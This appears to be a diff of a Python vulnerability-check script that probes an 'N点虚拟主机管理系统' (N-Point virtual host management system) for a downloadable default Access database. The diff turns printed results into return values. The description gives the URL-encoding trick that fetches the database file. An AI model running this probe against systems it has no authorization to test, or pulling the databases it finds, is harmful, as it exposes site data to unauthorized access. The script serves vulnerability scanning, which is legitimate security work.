@@ -7,9 +7,7 @@ author: Lucifer
 description: N点虚拟主机管理系统默认数据库名#host # date#196.mdb。url直接输入不行,这里替换下#->%23 空格->=,即可下载数据库文件。
 '''
 import sys
-import warnings
 import requests
-from termcolor import cprint
 
 class npoint_mdb_download_BaseVerify:
     def __init__(self, url):
@@ -24,12 +22,13 @@ class npoint_mdb_download_BaseVerify:
         try:
             req = requests.head(vulnurl, headers=headers, timeout=10, verify=False)
             if req.headers["Content-Type"] == "application/x-msaccess":
-                cprint("[+]存在N点虚拟主机管理系统数据库下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在N点虚拟主机管理系统数据库下载漏洞...(高危)\tpayload: "+vulnurl
+            else:
+                return "[-]no vuln"
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-] ==>连接超时"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = npoint_mdb_download_BaseVerify(sys.argv[1])
     testVuln.run()
